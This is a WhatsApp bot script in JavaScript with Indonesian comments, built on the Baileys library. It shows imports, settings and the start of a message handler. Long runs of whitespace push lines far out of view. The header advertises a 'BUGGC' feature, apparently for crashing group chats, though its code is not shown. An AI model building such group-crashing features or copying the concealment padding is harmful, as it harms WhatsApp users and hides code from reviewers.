                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /* 
  @ EDIT WELCOME DI MAIN.JS (BUAT BACKGROUND SENDIRI)
  @ GAK SUB = EROR
  @ CREDIT FOR ME -> SUBSCRIBE + 🔔 ITU AJA  || SUBSCRIBE FOR MORE UPDATE
  @ EDIT SEMUANYA DI SETTING.JSON
  @ ADA FITUR YG BELUM SEMPAT GUA FIX GARA² SINYAL LEMOT
  @ KLO NGEDIT YG TELITI SAYANG, EROR? DOWNLOAD ULANG SC NYA 
  @ BUGGC WORK DI BAILEYS 3.4.1 JADI UPGRADE AJA
  @ GK SEMUA FITUR WORK PASTI ADA YG EROR (KADANG WORK KADANG ERROR)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */
   
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
//const zrapi = require("zrapi")
const { help, convert, funmenu, download, maker, telestiker, other, ownermenu, set_stc_cmd, storage, cecanmenu, tag, upmenu, nsfw, asupan, allmenu} = require('./zeeone/zeeoneofc')
//const { help, convert, download, maker, other} = require('./zeeone/zeeoneofc')

var creatorList = ['𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘣𝘺 𝘡𝘦𝘦𝘰𝘯𝘦', 'ᴹᴿ᭄𝘻𝘦𝘦𝘰𝘯𝘦ㄙ×፝֟͜×', '𝘻𝘦𝘦𝘰𝘯𝘦𝘰𝘧𝘤' , ' 𝘈𝘭𝘱𝘩𝘢𝘣𝘰𝘵']
var creator = creatorList[Math.floor(Math.random() * creatorList.length)];

/*set_sticker_command*/
cmd_stc_menu = '7446'
cmd_stc_ping = '7292'
cmd_stc_play_music = '8046'
cmd_stc_group_close = '7850'
cmd_stc_group_open = '7878'
cmd_stc_image_to_sticker = '7688'
cmd_stc_to_image = '6964'
cmd_stc_self = '7038'
cmd_stc_public = '7144'
/*set_sticker_command*/
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /*
SEBAGIAN LU EDIT DI SETTING.JSON
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               thumbnail = setting.thumb
fthumb = setting.fakethumb
hit_today = []
blocked = []
prefix = setting.prefix
banChats = true
offline = false
img = setting.img
baper = 'SUB YT ZEEONE OFC'
apiku = 'api-alphabot.herokuapp.com'
targetpc = setting.ownerNumber
owner = targetpc
ownerr ='+62887435047326'
fake = setting.fake
numbernye = '0'
waktu = '-'
alasan = '-'
botname = setting.botname
ownername = setting.ownername
ownerNumberr = setting.ownerNumberr
ownerNumber = setting.ownerNumber
cr = setting.cr
petik = '```'
titik =`...`
n ='\n'
msgId="B826873620DD5947E683E3ABE663F263"
//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
       // m = simple.smsg(alpha, mek)
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        //m = simple.smsg(alpha, mek)
        //let { mentionedd } = m
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { quotedMek, isQuotedMek, mentioned} = mek
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
        //const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        //const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
